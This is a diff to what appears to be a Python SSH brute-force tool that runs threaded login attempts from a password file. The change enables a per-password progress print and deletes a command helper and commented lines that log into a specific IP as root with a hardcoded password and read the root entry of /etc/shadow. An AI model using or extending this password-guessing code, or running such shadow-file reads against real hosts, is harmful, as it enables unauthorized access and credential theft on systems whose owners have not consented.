@@ -16,11 +16,6 @@ Fails = 0
 KEYFILE = None
 PASSWD = None
 
-def send_command(s,cmd):
-    s.sendline(cmd)
-    s.expect(PROMPT)
-    return str(s.before,encoding="utf-8")[len(cmd)+2:]
-
 def connect_with_passwd(host,user,passwd,release):
     global Found
     global Fails
@@ -104,7 +99,7 @@ def ssh_pass(host,user,passwdFile):
             break
         CONNECTION_LOCK.acquire()
         passwd = line.strip('\r').strip('\n')
-        #print('[*] Testing: '+str(passwd))
+        print('[*] Testing: '+str(passwd))
         t = Thread(target=connect_with_passwd, args=(host,user,passwd,True))
         t.setDaemon(True)
         threads.append(t)
@@ -175,5 +170,3 @@ def main():
 
 if __name__=="__main__":
     main()
-#s=connect('10.108.36.71','root','indigosrpi')
-#send_command(s,'cat /etc/shadow | grep root')
